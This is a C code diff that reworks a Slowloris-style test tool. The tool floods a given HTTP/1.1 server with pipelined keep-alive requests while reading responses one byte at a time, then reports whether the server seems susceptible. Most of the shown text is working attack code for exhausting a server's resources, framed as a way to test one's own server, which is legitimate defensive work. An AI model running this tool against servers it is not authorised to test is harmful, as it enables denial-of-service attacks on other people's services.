@@ -74,59 +74,145 @@ static int wait4write(int fd);
 Main attack function
 ***************************************************************************** */
 
-#define WAIT_BEFORE_EXIT 0
-#define USE_PIPELINING 1
-#define MSG_PER_MTU 18
-#define MSG_LEN 27
-#define ATTACK_LIMIT (1 << 16)
-#define PIPELINED_MSG_LEN (MSG_LEN * MSG_PER_MTU)
-const char HTTP_REQUEST[] = "GET / HTTP/1.1\r\nHost:me\r\n\r\n"; /* 27 chars */
-char HTTP_PIPELINED[PIPELINED_MSG_LEN]; /* pipelined requests in MTU */
+#define WAIT_BEFORE_EXIT 1
+#define USE_PIPELINING 0
+#define PRINT_PAGE_OF_DATA 1
+#define MTU_LIMIT (524)
+#define ATTACK_LIMIT ((1 << 12) + 2024)
+
+static const char HTTP_REQUEST_HEAD[] =
+    "GET / HTTP/1.1\r\nConnection: keep-alive\r\nHost: ";
+static char MSG_OUTPUT[1024]; /* pipelined requests in MTU */
+static size_t MSG_LEN;
+static size_t REQ_PER_MSG;
+
+static void prep_msg(const char *hostname) {
+  /* copies an HTTP request to the internal buffer */
+  ASSERT_COND(strlen(hostname) < 512, "host name too long");
+  if (USE_PIPELINING) {
+    MSG_LEN = strlen(HTTP_REQUEST_HEAD) + strlen(hostname) + 4;
+    REQ_PER_MSG = 1;
+    memcpy(MSG_OUTPUT, HTTP_REQUEST_HEAD, strlen(HTTP_REQUEST_HEAD));
+    memcpy(MSG_OUTPUT + strlen(HTTP_REQUEST_HEAD), hostname, strlen(hostname));
+    MSG_OUTPUT[MSG_LEN - 4] = '\r';
+    MSG_OUTPUT[MSG_LEN - 3] = '\n';
+    MSG_OUTPUT[MSG_LEN - 2] = '\r';
+    MSG_OUTPUT[MSG_LEN - 1] = '\n';
+  } else {
+    memcpy(MSG_OUTPUT, HTTP_REQUEST_HEAD, strlen(HTTP_REQUEST_HEAD));
+    memcpy(MSG_OUTPUT + strlen(HTTP_REQUEST_HEAD), hostname, strlen(hostname));
+    MSG_LEN = strlen(HTTP_REQUEST_HEAD) + strlen(hostname) + 4;
+    REQ_PER_MSG = MTU_LIMIT / MSG_LEN;
+    MSG_OUTPUT[MSG_LEN - 4] = '\r';
+    MSG_OUTPUT[MSG_LEN - 3] = '\n';
+    MSG_OUTPUT[MSG_LEN - 2] = '\r';
+    MSG_OUTPUT[MSG_LEN - 1] = '\n';
+    if (!REQ_PER_MSG)
+      REQ_PER_MSG = 1;
+    for (size_t i = 1; i < REQ_PER_MSG; ++i) {
+      memcpy(MSG_OUTPUT + (i * MSG_LEN), MSG_OUTPUT, MSG_LEN);
+    }
+    MSG_LEN *= REQ_PER_MSG;
+  }
+}
 
 int main(int argc, char const *argv[]) {
+  signal(SIGPIPE, SIG_IGN);
   ASSERT_COND(argc == 3,
               "\nTo test HTTP/1.1 server against Slowloris, "
               "use: %s addr port\ni.e.:\t\t%s localhost 80",
               argv[0], argv[0]);
-  for (size_t i = 0; i < MSG_PER_MTU; ++i) {
-    memcpy(HTTP_PIPELINED + (i * MSG_LEN), HTTP_REQUEST, MSG_LEN);
-  }
-  const char *msg = USE_PIPELINING ? HTTP_PIPELINED : HTTP_REQUEST;
-  const size_t msg_len = USE_PIPELINING ? PIPELINED_MSG_LEN : MSG_LEN;
-  signal(SIGPIPE, SIG_IGN);
-  int fd = connect2tcp(argv[1], argv[2]);
+  /* copy HTTP request to a limit of 524 bytes or just once */
+  prep_msg(argv[1]);
+
   time_t start = 0;
   time(&start);
+
+  /* Connect to target */
+  int fd = connect2tcp(argv[1], argv[2]);
   ASSERT_COND(fd != -1, "\n ERROR: couldn't connect to %s:%s", argv[1],
               argv[2]);
+
+  /* Attack */
   size_t counter = 0;
-  while (wait4write(fd) == 0 && counter < ATTACK_LIMIT) {
-    size_t buf;
-    ++counter;
-    if (write(fd, msg, msg_len) == 1)
+  size_t blocks = 0;
+  size_t offset = 0;
+  size_t read_total = 0;
+  while (counter < ATTACK_LIMIT) {
+    if (wait4write(fd) < 0) {
+      if (errno != EWOULDBLOCK || ++blocks >= 5) /* wait up to 5 seconds */
+        break;
+      perror("wait4fd");
+      continue;
+    }
+    blocks = 0;
+
+    ssize_t w = write(fd, MSG_OUTPUT + offset, MSG_LEN - offset);
+    if (w == 0)
+      continue; /* connection lost? */
+    if (w < 0) {
+      /* error... waiting? */
+      if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR) {
+        if (++blocks >= 5)
+          break;
+        continue;
+      }
       break;
-    if ((counter & 3) == 0)
-      read(fd, &buf, 1); /* read a single byte at a time */
+    }
+    offset += w;
+    if (offset >= MSG_LEN)
+      offset = 0;
+    ++counter;
+    if ((counter & 3) == 0 && wait4read(fd) == 0) {
+      read(fd, &w, 1); /* read a single byte at a time */
+      ++read_total;
+    }
   }
+
   time_t end = 0;
   time(&end);
-  if (counter == ATTACK_LIMIT) {
+
+  /* Test results */
+  if (blocks == 5) {
+    /* test stopped after blocking too many times. */
+    fprintf(stderr,
+            "UNKNOWN...: a single slowloris client attacker sent %zu requests "
+            "and only "
+            "read %zu bytes... the target blocked further data, unknown if "
+            "server is effected.\n",
+            counter * (REQ_PER_MSG), read_total);
+
+  } else if (counter == ATTACK_LIMIT) {
+    /* finished sending all requests, no errors detected. */
     fprintf(
         stderr,
         "DANGER: a single slowloris client attacker sent %zu requests and only "
         "read %zu bytes... the target is likely suseptible to an attack.\n",
-        counter * (msg_len / MSG_LEN), (counter >> 2));
+        counter * (REQ_PER_MSG), read_total);
+
   } else {
+    /* couldn't send all requests, connection interrupted. */
     fprintf(
         stderr,
         "Passed: a single slowloris client attacker sent %zu requests and read "
         "%zu bytes... the target appears to have mitigated the attack.\n",
-        counter * (msg_len / MSG_LEN), (counter >> 2));
+        counter * (REQ_PER_MSG), read_total);
   }
   fprintf(stderr, "Attack took %zu seconds. %s\n", (size_t)(end - start),
           ((WAIT_BEFORE_EXIT) ? "Press enter to finish" : ""));
   if (WAIT_BEFORE_EXIT)
     getchar();
+  if (PRINT_PAGE_OF_DATA) {
+    char buffer[4096];
+    ssize_t l = -1;
+    if (wait4fd(fd) == 0)
+      l = read(fd, buffer, 4096);
+    if (l > 0)
+      fprintf(stderr, "Remaining %zd bytes of data:\n%.*s\n", l, (int)l,
+              buffer);
+    else
+      fprintf(stderr, "Couldn't read any data... connection lost?\n");
+  }
   close(fd);
   return counter == ATTACK_LIMIT;
 }
@@ -169,7 +255,7 @@ connect2tcp(const char *address, const char *port) {
   close(fd);
   return -1;
 socket_okay:
-  fprintf(stderr, "connection okay\n");
+  fprintf(stderr, "Connected to %s:%s\n", address, port);
   freeaddrinfo(addrinfo);
   return fd;
 }
@@ -182,16 +268,13 @@ static inline int wait__internal(int fd, uint16_t events) {
     struct pollfd ls[1] = {{.fd = fd, .events = events}};
     i = poll(ls, 1, 1000);
     if (i > 0) {
-      if (ls[0].revents == POLLHUP || ls[0].revents == POLLERR ||
-          ls[0].revents == POLLNVAL) {
+      if ((ls[0].revents & POLLHUP) || (ls[0].revents & POLLERR) ||
+          (ls[0].revents & POLLNVAL)) {
+        // close(ls[0].fd);
         errno = EBADF;
         return -1;
       }
       return 0;
-    }
-    if (i == 0) {
-      errno = EWOULDBLOCK;
-      return -1;
     }
     switch (errno) {
     case EFAULT: /* overflow */
@@ -201,6 +284,7 @@ static inline int wait__internal(int fd, uint16_t events) {
       return -1;
     }
   } while (errno == EINTR);
+  errno = EWOULDBLOCK;
   return -1;
 }
 
